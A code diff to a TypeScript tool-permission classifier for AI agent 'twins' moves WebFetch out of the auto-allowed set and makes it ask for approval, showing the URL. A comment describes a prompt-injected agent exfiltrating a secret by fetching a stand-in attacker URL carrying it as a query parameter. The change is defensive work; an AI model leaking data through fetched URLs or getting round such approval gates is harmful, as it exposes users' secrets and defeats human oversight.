@@ -39,8 +39,12 @@ const LOCAL_SAFE_TOOLS = new Set([
   "Grep",
   "Write",      // path-gated to scratch/<employeeId>/ via PreToolUse hook (sdk-defaults.ts)
   "WebSearch",  // CEO opted into web research; cost absorbed
-  "WebFetch",   // same — fetching public URLs is acceptable
+  // WebFetch is NOT here: the URL itself can carry data out (a prompt-injected
+  // twin could fetch https://attacker/?q=<secret>), so it asks. A CEO can opt
+  // a twin back in with a per-employee "allow" override.
   "ToolSearch", // SDK helper for tool discovery — purely internal
+  "TodoWrite",  // SDK planning scratchpad — purely internal
+  "StructuredOutput", // SDK's final-report tool (shift reports) — no side effects
   "Task",       // subagent dispatcher — auto-allow; the subagent's tool calls are gated separately
   "create_artifact", // local artifact renderer — UI-only, no external side effects
   // Meeting scratch — writes and reads stay inside the per-meeting disk
@@ -169,6 +173,16 @@ export function classifyTool(
   // Local sandbox + SDK built-in tools never need approval.
   if (LOCAL_SAFE_TOOLS.has(original) || LOCAL_SAFE_TOOLS.has(name)) {
     return { kind: "allow" };
+  }
+
+  if (name === "WebFetch") {
+    const url = typeof input?.url === "string" ? (input.url as string) : "";
+    return {
+      kind: "ask",
+      reason: url
+        ? `About to fetch ${url}. A URL can carry data out — check it before allowing.`
+        : "About to fetch a web page. Check the URL before allowing.",
+    };
   }
 
   // A read verb before a blocked term usually means the term is the object
